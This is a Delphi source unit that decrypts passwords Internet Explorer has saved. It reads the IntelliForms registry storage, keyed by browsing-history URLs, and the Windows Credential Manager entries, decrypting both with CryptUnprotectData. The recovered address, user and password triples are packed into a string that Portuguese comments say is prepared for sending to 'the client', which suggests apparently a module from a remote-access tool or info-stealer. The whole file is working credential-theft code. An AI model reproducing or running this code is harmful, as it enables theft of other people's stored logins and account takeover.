unit uIE7_decode;

interface

uses
  windows,
  CryptApi,
  uURLHistory,
  wcrypt2,
  UnitDiversos;

function ShowIEAutoCompletePWs: string;
function ShowIEWebCert           : String;
function ShowIEAutoCompletePlain : String;

implementation

function Format(sFormat: String; Args: Array of const): String;
var
  i: Integer;
  pArgs1, pArgs2: PDWORD;
  lpBuffer: PChar;
begin
  pArgs1 := nil;
  if Length(Args) > 0 then
    GetMem(pArgs1, Length(Args) * sizeof(Pointer));
  pArgs2 := pArgs1;
  for i := 0 to High(Args) do
  begin
    pArgs2^ := DWORD(PDWORD(@Args[i])^);
    inc(pArgs2);
  end;
  GetMem(lpBuffer, 1024);
  try
    SetString(Result, lpBuffer, wvsprintf(lpBuffer, PChar(sFormat), PChar(pArgs1)));
  except
    Result := '';
  end;
  if pArgs1 <> nil then
    FreeMem(pArgs1);
  if lpBuffer <> nil then
    FreeMem(lpBuffer);
end;

procedure GetHashStr(password : PWideChar; var hashstr : String);
var
  hProv : HCRYPTPROV;
  hHash : HCRYPTHASH;
  buffer : array of byte;
  dwhashlen : DWord;
  i : Integer;
  tail : Byte;
begin
  tail := 0;
  hashstr := '';
  CryptAcquireContext(@hProv,0,0,PROV_RSA_FULL,0);
  if CryptCreatehash(hProv, CALG_SHA1, 0, 0,@hHash) Then begin
    if CryptHashData(hHash,@password[0], (Length(password) + 1) * SizeOf(WideChar),0) Then begin
      dwHashLen := 20;
      SetLength(buffer,20);
      If CryptGetHashParam(hHash,HP_HASHVAL,@Buffer[0],@dwHashLen,0) Then begin
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        For i := 0 To dwHashLen - 1 Do begin
          tail := tail + buffer[i];
          hashstr := hashstr + Format('%2.2X', [buffer[i]]);
        end;
        hashstr := hashstr + Format('%2.2X', [tail]);
      end;
    end;
  end;
end;

function ValorPar(Num: Integer): boolean;
begin
  if (Num div 2) = (Num/2) then result := True else result := False;
end;

function DecodeData(const buf: Pointer; BufLen: Dword): String;
var
  headersize : DWord;
  Datasize   : DWord;
  MaxData    : DWord;
  offset     : DWord;
  datalength : DWord;
  pInfo      : Pointer;
  PData      : Pointer;
  i          : Integer;
  strTemp    : Pwidechar;
  PassUser: string;
begin
  result := '';
  CopyMemory(@headersize,Pointer(Cardinal(buf) +  4),4);
  CopyMemory(@Datasize,  Pointer(Cardinal(buf) +  8),4);
  CopyMemory(@MaxData,   Pointer(Cardinal(buf) + 20),4);
  Pinfo := Pointer(Cardinal(buf) + 36);
  PData := Pointer(Cardinal(buf) + headersize);
  for i := 0 To (MaxData -1) Do
  begin
    CopyMemory(@offset,pInfo,4);
    CopyMemory(@dataLength,Pointer(cardinal(pInfo) + 12),4);
    GetMem(strTemp,dataLength);
    strTemp := Pointer(Cardinal(buf) + HeaderSize+12+offset);
    if ValorPar(i) = true then PassUser := 'User: ' else PassUser := 'Password: ';
    result := result + PassUser + String(strTemp) + ' |';
    PInfo := Pointer(Cardinal(PInfo) + 16);
  end;
end;

function DecryptFromRegistry(ToCheck : tastring; Path : pansichar): string;
var
  History : tastring;
  i : Integer;
  m : Integer;
  HashStr : String;
  Key   : HKey;
  name  : PAnsiChar;
  namelength : cardinal;
  dwType : DWord;
  dwSize     : Dword;
  buffer : array of byte;
  DataIn : DATA_BLOB;
  DataOut: DATA_BLOB;
  OptionalEntropy : DATA_BLOB;
  Address: string;
  TempStr, TempStrResult, xResult: string;
begin
  xresult := '';
  m := 0;
  if RegOpenKeyEx(HKEY_CURRENT_USER,path,0,KEY_QUERY_VALUE, Key) = ERROR_SUCCESS Then begin
    namelength := 1024;
    GetMem(name,nameLength);
    While (RegEnumValue(Key,m,name,namelength,nil,nil,nil,nil) <> ERROR_NO_MORE_ITEMS) Do begin
      namelength := 1024;
      For i := 0 To  High(ToCheck) Do
      begin
        GetHashStr(ToCheck[i],HashStr);
//        if (lstrcmp(Pchar(Hashstr),name) = 0) Then
        begin
          //gleicher Wert!
          //Writeln('URL : ' + String(ToCheck[i]));
          //Writeln('Hash: ' + HashStr);

          //result := result + 'Address: '  + String(ToCheck[i]) + '|';

          //result := result + 'Hash    : ' + HashStr + #13#10;
          RegQueryValueEx(Key, name,nil,@dwType,nil,@dwSize);
          SetLength(buffer,dwSize);
          if RegQueryValueEx(Key, name,nil,@dwType,@buffer[0],@dwSize) = ERROR_SUCCESS Then
          begin
            DataIn.pbData := @buffer[0];
            DataIn.cbData := dwSize;
            OptionalEntropy.pbData := @ToCheck[i][0];
            OptionalEntropy.cbData := (Length(ToCheck[i]) + 1) * SizeOf(WideChar);
            if CryptUnprotectData(@DataIn,0,@OptionalEntropy,nil,nil,1,@DataOut) Then
            begin
              //writeln(DecodeData(DataOut.pbData, DataOut.cbData));
              xResult := xResult + 'Address: '  + String(ToCheck[i]) + '|';
              xResult := xResult + DecodeData(DataOut.pbData, DataOut.cbData) + #13#10;
            end;
          end;
        end;
      end;
      Zeromemory(name,namelength);
      inc(m);    
    end;
  end;
  RegCloseKey(Key);

  // daqui para baixo é só para enviar para o cliente
  // para deixar a resposta pronta
  while pos(#13#10, xResult) > 0 do
  begin
    Tempstr := copy(xResult, 1, pos(#13#10, xResult) - 1);
    delete(xResult, 1, pos(#13#10, xResult) + 1);

    xResult := replacestring(Tempstr + #13#10, '', xResult);

    if copy(tempstr, 1, pos(':', tempstr) - 1) = 'Address' then
    begin
      delete(tempstr, 1, pos(' ', tempstr));
      Address := copy(tempstr, 1, pos('|', tempstr) - 1);
      delete(tempstr, 1, pos('|', tempstr));
      while pos('|', tempstr) > 0 do
      begin
        delete(tempstr, 1, pos(' ', tempstr));
        tempstrresult := tempstrresult + Address + '|' + copy(tempstr, 1, pos('|', tempstr) - 1) + '|';
        delete(tempstr, 1, pos('|', tempstr));
        delete(tempstr, 1, pos(' ', tempstr));
        tempstrresult := tempstrresult + copy(tempstr, 1, pos('|', tempstr) - 1) + '|';
        delete(tempstr, 1, pos('|', tempstr));
        tempstrresult := tempstrresult + #13#10;
      end;
    end;
  end;
  Result := tempstrresult;
end;

function ShowIEWebCert      : String;
var
  Credential : PCREDENTIAL;
  Count : DWord;
  DataIn : DATA_BLOB;
  DataOut : DATA_BLOB;
  OptionalEntropy : DATA_BLOB;
  tmp : array[0..36] of SmallInt;
  password : array[0..36] of char;
  i : integer;
  plain : PWidechar;
begin
  result := '';
  password :=  'abe2869f-9b47-4cd9-a358-c22904dba7f7';
  for i :=0 To 36 Do  begin
    tmp[i] := (Ord(password[i]) * 4);
  end;
  OptionalEntropy.pbData := @tmp;
  OptionalEntropy.cbData := 74;
  CredEnumerate(nil, 0, count, Credential);
  for i:= 0 to count -1 do
  begin
    DataIn.pbData := Credential[i].CredentialBlob;
    DataIn.cbData := Credential[i].CredentialBlobSize;
    CryptUnprotectData(@DataIn, nil, @OptionalEntropy, nil, nil, 0, @DataOut);
    result := result + 'Address: ' + Credential[i].TargetName + ' |';
    GetMem(plain,Dataout.cbData);
    plain := Pwchar(DataOut.pbData);
    result := result + 'User: ' + Copy(plain, 0, Pos(':',plain) - 1)  + ' |';
    result := result + 'Password: ' + Copy(plain,Pos(':',plain) + 1,Length(plain) - Pos(':',plain))  + ' |' + #13#10;
  end;
  // daqui para baixo é só para enviar para o cliente
  // para deixar a resposta pronta
  result := ReplaceString('Address: ', '', result);
  result := ReplaceString('User: ', '', result);
  result := ReplaceString('Password: ', '', result);
end;

function ShowIEAutoCompletePWs: string;
var
  History : tastring;
begin
  result := '';
  EnumIEHistory(History);
  result := DecryptFromRegistry(history,'Software\Microsoft\Internet Explorer\IntelliForms\Storage2');
end;

function ShowIEAutoCompletePlain : String;
var
  FormNames : tastring;
begin
  result := '';
  SetLength(FormNames,2);
  FormNames[0] := 'username';          //google Suche
  FormNames[1] := 'q';  //vBulletin login - wie wärs mit noch mehr?
  result := pchar(DecryptFromRegistry(FormNames,'Software\Microsoft\Internet Explorer\IntelliForms\Storage1'));
end;

end.
